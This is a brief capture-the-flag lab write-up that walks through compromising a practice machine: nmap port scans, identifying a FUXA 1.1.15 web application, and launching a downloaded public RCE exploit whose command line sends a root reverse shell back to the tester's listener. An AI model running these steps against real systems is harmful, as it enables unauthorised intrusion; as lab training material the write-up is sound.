CTF-Labor-200-04

Target IP: 192.168.242.35
Challenge Description: Part 4 of Labor Day CTF Machine.

Reconnaissance


Performing a port scan, using the command sudo nmap -sS 192.168.242.35 -p-, shows there are two TCP ports open on the target machine.


I performed an aggressive port scan using the command sudo nmap -sV -A 192.168.242.35 -p 22,1881 and obtained more information about the two applications on the target machine. The application on the higher port is running some sort of HTTP application using Node.js. I will start enumeration with this application.

Enumeration & Exploitation

Port 1881: HTTP

After some manual enumeration, I identified the target machine is running FUXA 1.1.15-1316 as shown above.


Googling for Fuxa exploits led me to the interesting result above. By the looks of it, the application is likely vulnerable to RCE. I downloaded the exploit on my machine.


I started a listener on my machine at port 80. Then using the command python3 exp.py --rhost 192.168.242.35 --rport 1881 --lhost 192.168.45.203 --lport 80, I launched the exploit. And instantly, I obtained a reverse shell connection from the target machine with the session as the user root. No need to perform privilege escalation.

Flags


There is only one flag on the target machine: proof.txt, which is shown above. The email4.txt flag is also shown above.
